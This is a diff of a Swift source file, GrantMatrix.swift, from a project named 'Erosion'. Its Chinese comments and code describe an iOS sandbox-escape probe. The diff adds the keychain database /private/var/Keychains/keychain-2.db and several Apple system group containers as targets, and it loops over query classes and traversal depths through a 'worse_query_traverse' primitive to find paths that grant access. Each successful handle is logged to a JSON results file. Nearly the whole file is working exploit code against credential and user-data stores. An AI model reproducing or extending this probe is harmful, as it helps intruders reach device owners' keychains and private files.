@@ -2,17 +2,25 @@
 //  GrantMatrix.swift
 //  Erosion
 //
-//  精简版：只探最关键的 3 个路径，class 1-15 × part 1-4（alt=false），
-//  每个目标跑完立刻落盘，避免整体卡死时一无所获。
+//  class-13 / class-12 partDomain 穿越探测（老 bad_query 路径，27.0.x 可能仍开放）
+//  目标：/var/Keychains、Mobile Documents、Media
+//  结果写 Documents/grant-matrix-result.json
 //
 
 import Foundation
 
 enum GrantMatrix {
     static let targets = [
+        "/private/var/Keychains/keychain-2.db",
         "/private/var/Keychains",
         "/private/var/mobile/Library/Mobile Documents",
         "/private/var/mobile/Media"
+    ]
+
+    static let identifiers = [
+        "systemgroup.com.apple.mobilegestaltcache",
+        "systemgroup.com.apple.configurationprofiles",
+        "systemgroup.com.apple.trustd"
     ]
 
     static func run(group: String) {
@@ -21,12 +29,19 @@ enum GrantMatrix {
 
         for target in targets {
             var granted: [[String: Any]] = []
-            for queryClass in 1...15 {
-                for part in 1...4 {
-                    let handle = worse_query_ex(target, group, false, false, UInt64(queryClass), UInt64(part))
-                    if handle >= 0 {
-                        granted.append(["class": queryClass, "part": part, "handle": handle])
-                        worse_query_release(handle)
+            for identifier in identifiers {
+                for queryClass in [13, 12, 7] {
+                    for up in [6, 8, 10, 12] {
+                        let handle = worse_query_traverse(target, group, identifier, UInt64(queryClass), 3, Int32(up))
+                        if handle >= 0 {
+                            granted.append([
+                                "identifier": identifier,
+                                "class": queryClass,
+                                "up": up,
+                                "handle": handle
+                            ])
+                            worse_query_release(handle)
+                        }
                     }
                 }
             }
@@ -40,13 +55,13 @@ enum GrantMatrix {
             if let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) {
                 try? data.write(to: url)
             }
-            print("(grant-matrix) \(target) -> \(granted.count)/60 成功")
+            print("(traverse) \(target) -> \(granted.count) 个组合成功")
         }
 
         let final: [String: Any] = ["at": ISO8601DateFormatter().string(from: Date()), "done": true, "results": all]
         if let data = try? JSONSerialization.data(withJSONObject: final, options: [.prettyPrinted, .sortedKeys]) {
             try? data.write(to: url)
         }
-        print("(grant-matrix) 完成")
+        print("(traverse) 完成")
     }
 }
